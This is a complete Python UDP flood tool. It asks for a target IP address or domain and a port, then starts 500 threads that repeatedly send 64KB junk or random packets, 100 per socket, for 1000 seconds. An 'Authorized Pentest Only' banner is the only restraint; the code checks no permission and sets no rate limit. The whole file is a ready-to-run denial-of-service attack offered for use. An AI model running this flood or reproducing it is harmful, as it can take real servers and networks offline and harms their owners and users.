import os
import random
import sys
import socket
import threading
import time
import ipaddress

os.system('clear' if os.name == 'posix' else 'cls')

def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def generate_payloads():
    payloads = [
        random._urandom(65535),
        b"A" * 65535,
        b"X" * 65535,
        b"Y" * 65535,
        b"Z" * 65535,
        b"\x00" * 65535,
        b"\xff" * 65535,
        random._urandom(1024) * 64,
        b"GET / HTTP/1.1\r\n" + b"A" * 60000,
        b"UDP FLOOD" + random._urandom(65000)
    ]
    return random.choice(payloads)

def udp_flood(ip, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            addr = (ip, port)
            payload = generate_payloads()
            
            # Send multiple packets per iteration for maximum impact
            for _ in range(100):
                sock.sendto(payload, addr)
            
            sock.close()
        except:
            pass

def main():
    print("\033[1;31m█░█░█▀▄░█▀█      ▀█▀ █▀█ █▀█ █▀ ▀█▀ █▀▀ █▀█\033[0m")
    print("\033[1;31m█▄█░█▄█░█▀▀░ ▀▀▀ ░█░ █▄█ ▀▀█ ▄█ ░█░ ██▄ █▀▄\033[0m")
    print("\033[1;31m[INFO]\033[1;37m UDP Flood Attack - Authorized Pentest Only\033[0m")
    print("")
    
    # Get target IP
    while True:
        try:
            target = input("\033[1;31m[#]\033[0m \033[1;37mTarget IP: \033[0m")
            if target.strip():
                if is_valid_ipv4(target):
                    ip = target
                    break
                else:
                    try:
                        ip = socket.gethostbyname(target)
                        print(f"\033[1;31m[+]\033[0m Resolved \033[1;38;2;255;100;100m{target}\033[0m -> \033[1;38;2;255;100;100m{ip}\033[0m")
                        break
                    except:
                        print("\033[1;31m[!]\033[0m Invalid IP/Domain")
                break
        except KeyboardInterrupt:
            sys.exit(0)
    
    # Get target port
    while True:
        try:
            port = int(input("\033[1;31m[#]\033[0m \033[1;37mTarget Port: \033[0m"))
            if 1 <= port <= 65535:
                break
            else:
                print("\033[1;31m[!]\033[0m Port must be 1-65535")
        except:
            print("\033[1;31m[!]\033[0m Invalid port")
    
    print(f"\n\033[1;32m[+]\033[0m Starting UDP Flood on \033[1;38;2;255;100;100m{ip}:{port}\033[0m")
    print("\033[1;32m[+]\033[0m Attack Duration: 1000 seconds")
    print("\033[1;32m[+]\033[0m Threads: 500")
    print("\033[1;32m[+]\033[0m Packet Size: 64KB max")
    print("\033[1;31m[!]\033[0m Press Ctrl+C to stop\033[0m\n")
    
    # Optimized attack parameters
    THREAD_COUNT = 500
    ATTACK_DURATION = 1000  # seconds
    
    start_time = time.time()
    
    # Launch threads
    threads = []
    for i in range(THREAD_COUNT):
        thread = threading.Thread(target=udp_flood, args=(ip, port), daemon=True)
        thread.start()
        threads.append(thread)
    
    # Monitor attack duration
    try:
        while time.time() - start_time < ATTACK_DURATION:
            remaining = int(ATTACK_DURATION - (time.time() - start_time))
            print(f"\r\033[1;32m[*]\033[0m Flooding \033[1;38;2;255;100;100m{ip}:{port}\033[0m | Time Left: \033[1;33m{remaining}s\033[0m | Threads: \033[1;32m{THREAD_COUNT}\033[0m", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    
    print(f"\n\033[1;31m[!]\033[0m Attack completed/stopped. Total runtime: {int(time.time() - start_time)}s")
    sys.exit(0)

if __name__ == "__main__":
    main()